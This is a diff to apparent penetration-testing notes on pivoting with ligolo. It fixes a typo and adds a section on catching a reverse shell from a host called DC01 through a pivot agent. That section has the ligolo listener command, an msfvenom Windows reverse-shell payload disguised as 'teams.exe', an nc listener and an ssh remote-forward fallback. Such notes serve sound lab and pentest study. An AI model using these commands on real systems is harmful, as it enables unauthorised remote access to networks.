@@ -51,13 +51,44 @@ Finally you should be able now to simple do:
 
 And the icmp packets will be route through MS01 to DC01
 
-## Reverse Port Forward throgh agent to proxy
+## Reverse Port Forward through agent to proxy
 
 When the proxy is running in localhost. In a ligolo session, use the listener_add to start a reverse port forward through the agent to the proxy:
 
     listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
 
 This will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.
+
+## Reverse shell Through agent to proxy
+
+Let's say we have a server DC01 that can connect to A1, but not to our localhost. Our localhost as a ligolo proxy set and A1 has a ligolo agent running and a session has been started between our localhost proxy and the agent of A1. To start a revershell from DC01 to our local host we can do:
+
+First in the proxy we create a listener in the session of A1.
+
+```
+listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
+```
+
+This means that any connection to A1 on port 443 will be forwards to our localhost:443.
+
+Then we create a msfvenom payload from DC01 to A1 port 443:
+
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[A1_IP_ADDRESS] LPORT=443 -f exe -o teams.exe
+```
+
+We create our nc listener on port 443 in our localhost
+
+```shell
+nc -nvlp 443
+```
+
+Finally we upload the teams.exe payload to DC01 and run it. If there is an error with our ligolo listener, we can remove it and instead do port forwarding from A1 to our localhost with chisel or ssh:
+
+```shell
+ssh -i root.key -R [A1_IP_ADDRESS]:443:0.0.0.0:443 root@[A1_IP_ADDRESS] -vN
+```
+
 
 ## Cleaning up
 
